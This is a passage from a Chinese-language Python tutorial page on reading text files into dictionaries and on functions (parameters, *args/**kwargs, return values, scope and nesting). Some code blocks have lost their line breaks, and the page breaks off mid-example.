<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># #方法一：根据lines&#x27;&#x27;&#x27;#将文本内容写到字典张三 28李四 25王麻子 20&#x27;&#x27;&#x27;message_student_all = []message = open(&#x27;测试.txt&#x27;,mode=&#x27;r&#x27;,encoding=&#x27;utf-8&#x27;)  #将文件加载到内存,并将内存中的数据以unicode给变量message_read = message.readlines()for i in message_read :    message_student = &#123;&#125;             #必须要在此处设置空字典，这样列表里就是多个字典了，而且不受彼此影响    student = i.strip(&#x27;\n&#x27;).split(&#x27; &#x27;)    #去除换行符并根据空格来切割    name = student[0]    age = student[1]    message_student = &#123;&#x27;name&#x27;: name, &#x27;age&#x27;: age&#125;    message_student_all.append(message_student)print(message_student_all)message.close()&#x27;&#x27;&#x27;#将文本内容写到字典张三 28李四 25王麻子 20&#x27;&#x27;&#x27;#方法二：根据linemessage_student_all = []message = open(&#x27;测试.txt&#x27;,mode=&#x27;r&#x27;,encoding=&#x27;utf-8&#x27;)  #将文件加载到内存,并将内存中的数据以unicode给变量message_read = message.read()   #读取所有内容student = message_read.split(&#x27;\n&#x27;) #根据换行符进行切割# print(student)for v in student :    v = v.strip(&#x27;\n&#x27;)    #去除每一行的换行符    name,age = v.strip().split(&#x27; &#x27;)         #去除空格并按照空格切割    message_student = &#123;&#125;  # 必须要在此处设置空字典，这样列表里就是多个字典了，而且不受彼此影响    message_student = &#123;&#x27;name&#x27;: name, &#x27;age&#x27;: age&#125;    message_student_all.append(message_student)print(message_student_all)message.close()</span></span><br></pre></td></tr></table></figure>

















<h2 id="第五章-函数"><a href="#第五章-函数" class="headerlink" title="第五章 函数"></a>第五章 函数</h2><h3 id="5-1-函数的基本知识"><a href="#5-1-函数的基本知识" class="headerlink" title="5.1 函数的基本知识"></a>5.1 函数的基本知识</h3><p>编程思想：</p>
<ul>
<li>面向过程编程：学习函数之前编写的代码都是面向过程，从上到下执行<ul>
<li>缺点：代码量多，不利于阅读；代码重用性不高</li>
</ul>
</li>
<li>面向函数编程：学习了函数之后编写代码，就是面向函数编程<ul>
<li>优点：代码分门别类，便于阅读；代码重用性高</li>
</ul>
</li>
</ul>
<p>函数的特点：</p>
<ul>
<li><p>一个函数就是一个作用域</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">i</span>):</span>    <span class="built_in">print</span>(i)<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):       echo(i)   <span class="comment">#每调用一次就创建一个内存，内存中传递的i也不一样&#x27;&#x27;&#x27;结果为：0123456789&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li><p>函数本身是不可变类型</p>
</li>
<li><p>函数名就是相当于一个变量，指向了函数里面的代码，所以如果打印函数名，得到的只是一串地址，指向函数代码的地址</p>
</li>
</ul>
<p>函数名的特点</p>
<ul>
<li><p>函数名可以将其看作是变量，完全可以将其看做变量来使用，比如可以插在字典里，列表、元组里，并且可以将其作为参数来传递</p>
<p>注意点：如果将函数名放在集合里，放3个 fun  那么打印的结果是什么？</p>
<ul>
<li>结果：该函数的代码所在的地址，因为集合是不重复的</li>
</ul>
</li>
<li><p>如果将一个函数名赋值给了另外一个变量，那么该变量相当于也指向了该函数的代码块，从另外一种意义上来说，该变量就相当于一个函数了，在该变量后面加上括号()就可以调用函数了</p>
</li>
<li><p>函数名相当于变量，所以如果给函数名重新赋值，那么该变量就不再是函数</p>
</li>
<li><p>函数名可以作为参数进行传递</p>
</li>
<li><p>函数名可以作为返回值进行返回</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#函数名作为变量插入到序列中</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">lis = []</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    lis.append(inner)</span><br><span class="line">lis[<span class="number">0</span>]()  <span class="comment">#结果为：666</span></span><br><span class="line">lis[<span class="number">2</span>]()   <span class="comment">#结果为：666</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#函数名赋值给其他变量</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;888&#x27;</span>)</span><br><span class="line">index = inner   <span class="comment">#将inner函数代码的内存地址赋值给变量index</span></span><br><span class="line">index()   <span class="comment">#所以调用该变量，就是调用原inner函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#将其他数据赋值给函数名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;888&#x27;</span>)</span><br><span class="line">inner = <span class="string">&#x27;重新赋值&#x27;</span>   <span class="comment">#给inner重新赋值，所以inner不再指向函数代码，即inner不是函数了</span></span><br><span class="line"><span class="built_in">print</span>(inner)   <span class="comment">#结果为：重新赋值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#函数名作为参数进行传递</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;888&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>(<span class="params">name</span>):</span></span><br><span class="line">    name()   <span class="comment">#此时相当于inner()</span></span><br><span class="line">fun(inner)   <span class="comment">#结果为：888</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#函数名作为返回值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fun</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;777&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> fun    <span class="comment">#返回的是fun函数代码的内存地址</span></span><br><span class="line">index = inner()   <span class="comment">#将内存地址赋值给变量index</span></span><br><span class="line">index()   <span class="comment">#所以调用该变量，就是调用原fun函数</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>函数名和 函数名 +()    的区别：</p>
<ul>
<li>函数名类似于变量，内容是一串指向函数代码的地址，可以作为变量插在序列里，可以作为参数来传递</li>
<li>函数名 +()    相当于是函数的调用，就是执行函数，如果将函数名赋值给了另外一个变量，那么如果执行 变量 + () 也就是相当于指向该变量所指向的函数</li>
</ul>
<p>函数的应用场景：</p>
<ul>
<li>代码量多，超过一屏</li>
<li>代码重用性高</li>
</ul>
<p>意见建议：</p>
<ul>
<li>推荐不管多少代码，都用函数</li>
</ul>
<p>函数的定义：</p>
<ul>
<li><p>特点：函数不管定义多少个，如果不调用该函数，那么该定义的函数里面的代码不会执行</p>
</li>
<li><p>def 函数名   括号()      冒号</p>
</li>
<li><p>缩进</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> 函数名() :</span>     <span class="comment">#冒号必不可少</span></span><br><span class="line">    代码                   <span class="comment">#缩进不能少</span></span><br></pre></td></tr></table></figure>



<p>函数的说明（注释）：</p>
<ul>
<li><p>建议：每个甘薯都必须要写函数说明</p>
</li>
<li><p>功能：对函数功能的说明</p>
</li>
<li><p>使用三引号</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#定义函数，输入三引号，然后再三引号内部回车即可</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ceshi</span>(<span class="params">x</span>):</span>      </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;   </span></span><br><span class="line"><span class="string">    这是函数的使用说明</span></span><br><span class="line"><span class="string">    :param x:接收的参数</span></span><br><span class="line"><span class="string">    :return:返回值为空</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line">ceshi(<span class="number">10</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<p>函数的调用（执行）：</p>
<ul>
<li>函数名 + ()</li>
<li>函数的内存地址 + ()</li>
<li>函数执行的本质：<ul>
<li>每调用一次，就是新开辟了一个内存</li>
<li>多次调用同一个函数，就是开辟了多个内存，这几个内存中的数据互不影响</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#函数名 + ()  实现函数调用</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line"></span><br><span class="line">message()        <span class="comment">#调用函数，输入函数名 + 括号</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#函数的内存地址 + () 实现函数的调用</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">a = message   <span class="comment">#获取函数所在的内存地址，将其给变量a,也就是a指向了函数</span></span><br><span class="line"><span class="built_in">print</span>(a)   <span class="comment">#获得了a所指向的函数的内存地址，&lt;function message at 0x00000000026BB310&gt;</span></span><br><span class="line">a()    <span class="comment">#通过a所指向的函数所在地址来调用 ，结果为：666</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>







<p>函数的销毁：</p>
<ul>
<li><p>前提：</p>
<p>函数执行完毕并且该函数里的变量没被占用（使用）</p>
</li>
<li><p>易错点：必须要以上两个条件同时满足函数才会被销毁</p>
</li>
</ul>
<h3 id="5-2-函数的参数"><a href="#5-2-函数的参数" class="headerlink" title="5.2 函数的参数"></a>5.2 函数的参数</h3><p>分类：</p>
<ul>
<li>形参：定义函数时的参数名</li>
<li>实参：调用函数时的参数名</li>
</ul>
<p>传参：</p>
<ul>
<li><p>可接受的参数类型：所有类型</p>
</li>
<li><p>根本原则：所有的位置（args传参也算位置传参）传参必须要在关键字传参(kwargs也算关键字传参)之前</p>
</li>
<li><p>分类：</p>
<p>位置传参：不指定关键字，直接传参数</p>
<ul>
<li>注意点：和关键字传参混合使用时，一定要遵循的原则，所有的位置传参必须要在关键字传参之前</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span>(<span class="params">a,b,c</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(a,b,c)   <span class="comment">#结果为：1 2 3</span></span><br><span class="line">message(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)        <span class="comment">#位置传参，和形参一一对应</span></span><br></pre></td></tr></table></figure>



<p>关键字传参：通过关键字(形参名)来传参</p>
<ul>
<li>注意点：和关键字传参混合使用时，一定要遵循的原则，所有的位置传参必须要在关键字传参之前，也就是关键词传参之后不能再出现位置传参</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#正确做法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span>(<span class="params">a,b,c</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(a,b,c)   <span class="comment">#结果为：1 3 2</span></span><br><span class="line"></span><br><span class="line">message(<span class="number">1</span>,c = <span class="number">2</span>,b = <span class="number">3</span>)        <span class="comment">#关键字传参，但是位置传参必须要在最前面</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#错误做法：</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span>(<span class="params">a,b,c</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(a,b,c)   <span class="comment">#报错：SyntaxError: positional argument follows keyword argument</span></span><br><span class="line">message(<span class="number">1</span>,c = <span class="number">2</span>,<span class="number">3</span>)        <span class="comment">#错误：位置传参3在关键字传参之后</span></span><br></pre></td></tr></table></figure>



<p>默认传参：</p>
<ul>
<li><p>设置默认参数的推荐方法：将默认参数设置为None</p>
</li>
<li><p>特性：调用函数时如果没传递该默认参数，则执行该函数时该参数就按照默认的值来；如果我们在调用函数，传递了该默认参数，那么该默认参数的值就按照我们传递的值来算。</p>
</li>
<li><p>表现形式： 参数名 = 数据</p>
</li>
<li><p>注意点：修改默认参数，一定要注意，最好只修改数据类型为不可变类型的参数，如果修改的参数是可变类型，那么后续会导致各种bug</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span>(<span class="params">a,b,c = <span class="number">5</span></span>):</span>       <span class="comment">#默认参数c为5</span></span><br><span class="line">    <span class="built_in">print</span>(a,b,c)            <span class="comment">#没传递默认参数，那么默认参数的值就按照默认的5来算</span></span><br><span class="line">message(<span class="number">1</span>,<span class="number">2</span>)        <span class="comment">#此时传递2个参数并不会报错，默认参数可指定可不指定</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#位置传递默认参数：传递默认参数，按照传递的值来算</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span>(<span class="params">a,b,c = <span class="number">5</span></span>):</span>       <span class="comment">#默认参数c为5</span></span><br><span class="line">    <span class="built_in">print</span>(a,b,c)            <span class="comment">#传递了默认参数10，所以此时c为10</span></span><br><span class="line">message(<span class="number">1</span>,<span class="number">2</span>,<span class="number">10</span>)        <span class="comment">#此时传递的第三个参数为默认参数，所以默认参数的值变为了10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#关键字传递默认参数：传递默认参数，按照传递的值来算</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span>(<span class="params">a,b,c = <span class="number">5</span></span>):</span>       <span class="comment">#默认参数c为5</span></span><br><span class="line">    <span class="built_in">print</span>(a,b,c)            <span class="comment">#传递了默认参数20，所以此时c为20</span></span><br><span class="line">message(<span class="number">1</span>,<span class="number">2</span>,c = <span class="number">20</span>)        <span class="comment">#此时传递的第三个参数为默认参数，所以默认参数的值变为了20</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<p>默认传参必须是不可变类型的原因：</p>
<ul>
<li><p>基本原理：因为在我们定义函数时，函数里的变量就会被创建，所以函数里的变量会在函数执行前被创建；那么如果我们在传参时不修改默认参数，我们每一次调用函数开辟的内存实际上都是在共用一个变量（默认参数），如果该默认参数时可变类型，我们第一次调用函数，利用代码(比如append)对默认参数所指向的可变类型进行了修改，那么当我们第二次调用该函数时，该函数的默认变量就不再是原来的初始值了，而是经过第一次函数调用修改后的值，所以这样会导致默认参数失去了意义；而如果使用不可变类型，因为无法修改，所以就不存在这种情况；</p>
</li>
<li><p>```python<br>def fun(a,b = []):  #在定义函数时，这两个变量就创建了      b.append(a)  print(a,b)  fun(1)  #结果为：1 [1]，执行完，默认参数b所指向的列表已经发生了变化[1]fun(2)    #执行到这里，默认参数指向[1]，然后再执行添加2，所以结果为[1, 2]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 示意图：</span><br><span class="line"></span><br><span class="line">  ![image-20200429192104944](https://gitee.com/python_road/python_img/raw/master/img/20200429192106.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">接收所有的位置参数：</span><br><span class="line"></span><br><span class="line">- 优点：不需要写多个形参，无论传递过来多少个实参，只需要一个 *args 就能全部接受</span><br><span class="line"></span><br><span class="line">- 缺点：只能接收位置传参，不能和关键字传参结合使用</span><br><span class="line"></span><br><span class="line">- 特性：将接收来的所有参数全部加到一个元组里了</span><br><span class="line"></span><br><span class="line">- 表现形式：</span><br><span class="line"></span><br><span class="line">  函数位置：*args   英文单词是arguments</span><br><span class="line"></span><br><span class="line">  调用函数位置：（传参时）</span><br><span class="line"></span><br><span class="line">- 无星号：多个参数，例如 fun(‘你好’,&#x27;s&#x27;)        参数‘你好’和参数&#x27;s&#x27;全部被args接收了，接收到的左右数据全部加到一个元组里了</span><br><span class="line"></span><br><span class="line">  - 有星号：*(&#x27;你好&#x27;,&#x27;s&#x27;)        星号后面的    (&#x27;你好&#x27;,&#x27;s&#x27;)   作为一个整体传递给了args，所以args就等于(&#x27;你好&#x27;,&#x27;s&#x27;) </span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">#传参时无星号def message(*args):       #将星号后的参数作为一个整体传递给了args    print(args)            #结果为：(1, 2, 20)message(1,2,20)        #传参时无星号：不能和关键字传参结合使用def message(*args):       #接收所有参数，并将所有参数加入到一个元组里print(args)            #报错：TypeError: message() got an unexpected keyword argument &#x27;c&#x27;message(1,2,c = 10)    #错误：*args不能用关键字传参，不能和字传参结合传参</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">接收所有的关键字参数：- 优点：可以接收所有的关键字参数- 缺点：只能接收关键字参数，不能接收位置参数- 特性：将接收来的参数全部加到一个字典里了，其中关键字作为该字典的键，等于号后面的值作为字典的值- 表现形式：    函数位置： **kwargs           kw是keyword的缩写    调用函数位置：（传递参数时）    - 有双星号：        - 主要用途：传递字典，而不是变量字典        - 原理：将双星号后的字典作为一个整体，传递给了kwargs，所以kwargs就是相当于直接等于双星号后面的这个字典        - 易错点：当我们用双星号直接传递字典时，需要注意，键和值的位置要区分号变量和字符串的关系，如果不加单引号，容易提示不存在该变量    - 无双星号：        - 表现形式：用等于号 = 连接        - 将每个参数（以等号连接的表达式算一个参数）拆分成一个键值对加入到一个字典中    ```python    <span class="comment"># 有双星号 **：fun(**&#123;&#x27;a&#x27; =&#x27;s&#x27;&#125;)    将双星号后面的字典作为一个整体传递给kwargs，所以kwargs等于该字典    # 无双星号** ：fun( a =&#x27;s&#x27;,b = &#x27;s1&#x27;)      将每一个参数根据等于号来进行拆分，拆分成键值对加入到字典中            # 无双星号** ：    def message(**kwargs):       #将每一个参数根据等于号来进行拆分，拆分成键值对加入到字典中        print(kwargs)            #结果为：&#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2&#125;    message(a = 1,b=2)                # 有双星号 **：fun(**&#123;a =&#x27;s&#x27;&#125;)    def message(**kwargs):       #将接收来的字典直接传递给kwargs        print(kwargs)            #结果为：&#123;&#x27;a&#x27;: 1&#125;    message( **&#123;&#x27;a&#x27;:1&#125; )    #双星号用途主要是传递字典，此时双星号后的字典&#123;&#x27;a&#x27;:1&#125;直接等于kwargs    </span></span><br></pre></td></tr></table></figure>

<p>​    </p>
<p>接收所有参数：万能接收</p>
<ul>
<li><p>特点：*args和**kwargs的组合</p>
</li>
<li><p>接收的参数：位置参数、关键字参数都可以接收</p>
</li>
<li><p>易错点：在传参的时候，可以只传一种类型的参数，哪怕函数的形参有args和kwargs，我们传参的时候只传位置参数或者只传关键字参数都可以，没传的参数所代表的的形参就位空</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#只传位置参数，那么关键词蚕食就是空字典def func1(*args,**kwargs):    print(args,kwargs)func1(*&#123;&#x27;武沛齐&#x27;,&#x27;金鑫&#x27;,&#x27;女神&#x27;&#125;)     #结果为：(&#x27;金鑫&#x27;, &#x27;女神&#x27;, &#x27;武沛齐&#x27;) &#123;&#125;#只传关键字参数，那么位置参数就是空元组def func1(*args,**kwargs):    print(args,kwargs)func1(**&#123;&#x27;k1&#x27;:&#x27;栈&#x27;&#125;)    #结果为：() &#123;&#x27;k1&#x27;: &#x27;栈&#x27;&#125;</span></span><br></pre></td></tr></table></figure></li>
<li><p>语法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#位置在前，关键字在后（一）：def fun(*args,**kwargs):    #接收所有的参数：包括位置和关键字    print(args,kwargs)    #结果为：((3, 6, 8),) &#123;&#x27;b&#x27;: 20&#125;fun((3,6,8),b = 20)    #原则：位置在前，关键字在后#位置在前，关键字在后（二）：def fun(*args,**kwargs):    #接收所有的参数：包括位置和关键字    print(args,kwargs)    #结果为：(3, 6, 8) &#123;&#x27;b&#x27;: 20&#125;fun(3,6,8,b = 20)    #原则：位置在前，关键字在后#位置在后，关键字在前，报错def fun(*args,**kwargs):    #接收所有的参数：包括位置和关键字    print(args,kwargs)    #报错：SyntaxError: positional argument follows keyword argumentfun(3,6,b = 20,8)    #报错：此处位置参数在关键字参数之后</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>通过参数传递函数名：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 函数名可以作为参数进行传递def func(arg):    arg()   #相当于show()，这里也即是执行了函数的调用def show():    print(&#x27;show函数&#x27;)func(show)    #结果为：show函数</span></span><br></pre></td></tr></table></figure>









<h3 id="5-3-函数的返回值"><a href="#5-3-函数的返回值" class="headerlink" title="5.3 函数的返回值"></a>5.3 函数的返回值</h3><p>语法：</p>
<ul>
<li>如果没有return，则默认返回None</li>
<li>return  什么      就返回什么   </li>
</ul>
<p>特性：</p>
<ul>
<li><p>碰到return，就会自动终止该函数，直接返回值，return后续的代码不再执行；当前函数执行完毕，如果是多层函数，那么就会回到上层函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#return配合死循环实现输入n返回上一级def fun():    while True :  #必须要加死循环，便于下级函数执行完毕后进行二次判断        print(&#x27;1.业务查询\n2.业务办理\n3.人工服务&#x27;)        choice = input(&#x27;输入n退出&#x27;)        if choice == &#x27;n&#x27;:            return                  #结束本函数        elif choice == &#x27;1&#x27;:            business_query()        elif choice == &#x27;2&#x27;:            print(&#x27;该功能正在开发中....&#x27;)def business_query():    &#x27;&#x27;&#x27;业务查询&#x27;&#x27;&#x27;    while True :        #必须要加死循环，便于下级函数执行完毕后进行二次判断        print(&#x27;1.话费查询\n2.流量查询&#x27;)        choice = input(&#x27;输入n退出&#x27;)        if choice == &#x27;n&#x27;:            return              #结束本函数，回到上级函数fun        elif choice == &#x27;1&#x27;:            phone_query()        elif choice == &#x27;2&#x27;:            print(&#x27;该功能正在开发中&#x27;)def phone_query():    &#x27;&#x27;&#x27;查询话费&#x27;&#x27;&#x27;    while True :            #必须要加死循环，便于下级函数执行完毕后进行二次判断        print(&#x27;查询成功！你当前话费：63元&#x27;)        choice = input(&#x27;输入n退出&#x27;)        if choice == &#x27;n&#x27;:            return              #结束本函数，回到上级函数business_queryfun()</span></span><br></pre></td></tr></table></figure></li>
<li><p>如果返回多个数据，用逗号隔开，返回得到的是一个元组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span>():</span>    <span class="keyword">return</span> <span class="number">5</span>,<span class="number">6</span>,7a = message()        <span class="comment">#调用函数，输入函数名 + 括号print(a)    #结果为：(5, 6, 7)</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>返回值所支持的类型：</p>
<ul>
<li>任何数据类型</li>
<li>表达式</li>
</ul>
<p>特殊情况：return 3,4,5   相当于 return (3,4,5)</p>
<p>问题：return和break的区别？</p>
<ul>
<li>return：终止当前函数，直接返回值</li>
<li>break：跳出当前循环，如果循环在函数里，那么break只会跳出该循环，而不会跳出该函数</li>
</ul>
<h3 id="5-4函数的作用域"><a href="#5-4函数的作用域" class="headerlink" title="5.4函数的作用域"></a>5.4函数的作用域</h3><p>定义：一个函数就是一个作用域</p>
<p>分类：</p>
<ul>
<li>全局作用域：全局作用域无法调用局部作用域里的变量；父级</li>
<li>局部作用域：局部作用域里可以调用全局作用域里的变量；子级<ul>
<li>特点：局部作用域里的变量一旦执行完毕，该变量会被销毁；可以找到父级作用域中的值，但是无法对其重新赋值；但是如果该值是可变类型，那么则可以对其进行修改</li>
</ul>
</li>
</ul>
<p>在作用域中查找数据的规则：</p>
<ul>
<li><p>先在当前作用域查找，如果没找到，就向上级作用域查找，一直向上查找，如果查到头（全局作用域）还没找到该数据，那么程序会报错，提示该数据不存在（或者改变了不存在）</p>
</li>
<li><p>如果变量定义在函数调用之前，那么函数就可以找到改变量；如果变量定义在函数调用之后，那么函数就无法找到改变量，程序会报错，提示改变量不存在</p>
</li>
<li><p>子作用域中只能找到父级的值，而无法对该值进行重新赋值，但是如果该值是可变类型，那么则可以对其进行修改</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#变量定义在函数调用之前，那么函数就可以找到改变量a = 10def fun():    #可以不接受参数    print(a)    #结果为：10 ，因为变量定义在函数调用之前fun()    #可以不传递参数#变量定义在函数调用之后，那么函数就无法找到改变量，程序会报错，提示改变量不存在def fun():        print(a)    #报错：NameError: name &#x27;a&#x27; is not definedfun()    a = 10   #该变量定义在函数调用之后，所以函数会找不到该变量#查找数据先从当前作用域查找，函数里的局部变量在函数执行完毕后会自动销毁（一）：a = 10def fun():    a = 20    print(a)   #查找数据先从当前作用域查找，如果存在，就直接使用，所以结果为20fun()print(a)   #结果为10，因为函数里的变量在函数执行完毕后会销毁，并且函数没有修改10，只是给a重新赋值了而已，赋值不等于修改#查找数据先从当前作用域查找，函数里的局部变量在函数执行完毕后会自动销毁(二)：a = [1,2]def fun():    a.append(6)    #这里是对原列表进行了修改，和a没有关系，所以如果a销毁了，该列表还是变成了[1,2,6]    print(a)   fun()print(a)   #结果:[1, 2, 6]   因为函数对列表[1,2]进行了修改</span></span><br></pre></td></tr></table></figure>







<h3 id="5-5函数的嵌套"><a href="#5-5函数的嵌套" class="headerlink" title="5.5函数的嵌套"></a>5.5函数的嵌套</h3><p>特点：</p>
<ul>
<li>每个函数执行完，它作用域里的变量将会被销毁</li>
<li>只定义了函数，但是没有调用函数，那么该函数还是没有执行</li>
<li>碰到函数的调用，就先进入该函数 ，然后执行里面的代码</li>
<li>作用域查找数据、查找变量，现在当前作用域查找，当前作用域没有，就向上一级找，一级一级往上找，直至全局作用域</li>
<li>只能找到父级（上面级别）作用域的值，而无法对其重新赋值，但是如果该值是可变类型，那么则可以对其进行修改</li>
</ul>
<p>注意点：</p>
<ul>
<li>定义函数就是创建函数，函数在哪个作用域被创建，那么该作用域就是被创建的那个函数的父级作用域，所以找数据，如果被创建的作用域里没有，就去它的父级找，也就是定义函数的代码在那个作用域，那么该函数找数据的父级就是该做作用域</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#函数的嵌套与作用域：当前作用域中有数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>():</span></span><br><span class="line">    a = <span class="number">20</span></span><br><span class="line">    <span class="built_in">print</span>(a)   <span class="comment">#结果为：20,执行完，当前所在作用域(fun的作用域)的a销毁</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fun1</span>():</span></span><br><span class="line">        a = <span class="number">30</span></span><br><span class="line">        <span class="built_in">print</span>(a)    <span class="comment">#结果为：30，执行完，当前所在作用域(fun1的作用域)的a销毁</span></span><br><span class="line">    fun1()</span><br><span class="line">a = <span class="number">10</span></span><br><span class="line">fun()</span><br><span class="line"><span class="built_in">print</span>(a)   <span class="comment">#结果为10</span></span><br><span class="line"><span class="comment">#最终结果为：20   30    10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#函数的嵌套与作用域（二）</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>():</span></span><br><span class="line">    a = <span class="number">20</span></span><br><span class="line">    <span class="built_in">print</span>(a)   <span class="comment">#结果为：20</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fun1</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(a)    <span class="comment">#结果为：20，当前作用域没有，就从上一级开始查找</span></span><br><span class="line">    fun1()</span><br><span class="line">a = <span class="number">10</span></span><br><span class="line">fun()</span><br><span class="line"><span class="built_in">print</span>(a)   <span class="comment">#结果为10</span></span><br><span class="line"><span class="comment">#最终结果为：20   20    10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#函数的嵌套与作用域（三）</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>():</span></span><br><span class="line">    a = <span class="number">20</span></span><br><span class="line">    <span class="built_in">print</span>(a)   <span class="comment">#结果为：20</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fun1</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(a)    <span class="comment">#结果为：30，当前作用域没有，就从上一级开始查找,以上一个作用域的最新值为准</span></span><br><span class="line">    a = <span class="number">30</span></span><br><span class="line">    fun1()</span><br><span class="line">a = <span class="number">10</span></span><br><span class="line">fun()</span><br><span class="line"><span class="built_in">print</span>(a)   <span class="comment">#结果为10</span></span><br><span class="line"><span class="comment">#最终结果为：20   30    10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#函数的嵌套与作用域（三）</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>():</span></span><br><span class="line">    a = <span class="number">20</span></span><br><span class="line">    <span class="built_in">print</span>(a)   <span class="comment">#结果为：20</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fun1</span>():</span></span><br><span class="line">        <span 